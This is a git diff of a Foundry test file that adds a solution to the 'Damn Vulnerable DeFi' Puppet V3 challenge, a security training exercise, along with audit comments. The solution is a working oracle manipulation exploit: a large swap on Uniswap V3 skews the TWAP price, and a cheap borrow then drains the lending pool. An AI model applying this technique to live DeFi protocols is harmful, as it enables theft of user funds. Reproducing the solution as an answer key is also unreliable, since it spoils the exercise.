@@ -10,6 +10,9 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+//
+import '@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol';
+import '@uniswap/v3-periphery/contracts/libraries/TransferHelper.sol';
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -18,7 +21,7 @@ contract PuppetV3Challenge is Test {
 
     uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
     uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
-    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18; // @audit This is actually more than the current reserves of DVT on UV3
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
     uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
     uint24 constant FEE = 3000;
@@ -65,7 +68,7 @@ contract PuppetV3Challenge is Test {
             token0: token0,
             token1: token1,
             fee: FEE,
-            sqrtPriceX96: _encodePriceSqrt(1, 1)
+            sqrtPriceX96: _encodePriceSqrt(1, 1) // @q what is this?
         });
 
         IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
@@ -82,7 +85,7 @@ contract PuppetV3Challenge is Test {
                 tickUpper: 60,
                 fee: FEE,
                 recipient: deployer,
-                amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
+                amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY, // @audit hardcoded, how do you now token0 is WETH? should compare and set 
                 amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
                 amount0Min: 0,
                 amount1Min: 0,
@@ -118,8 +121,34 @@ contract PuppetV3Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV3() public checkSolvedByPlayer {
+    function test_puppetV3() public 
+    checkSolvedByPlayer 
+    {
+        // 1. Make a huge swap
+        // For simplicity I use the router instead of interact directly with the pool -> https://docs.uniswap.org/contracts/v3/guides/swaps/single-swaps
+        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // taken from docs
         
+        ISwapRouter.ExactInputSingleParams memory params =
+        ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: FEE,
+            recipient: player,
+            deadline: block.timestamp,
+            amountIn: 110e18,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        });
+
+        TransferHelper.safeApprove(address(token), address(router), 110e18);
+
+        router.exactInputSingle(params);
+
+        // 2. Wating just a bit of time, if no other huge swap is performed, the manipulation suceeds
+        skip(114 seconds);
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
@@ -135,3 +164,7 @@ contract PuppetV3Challenge is Test {
         return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
     }
 }
+
+
+
+
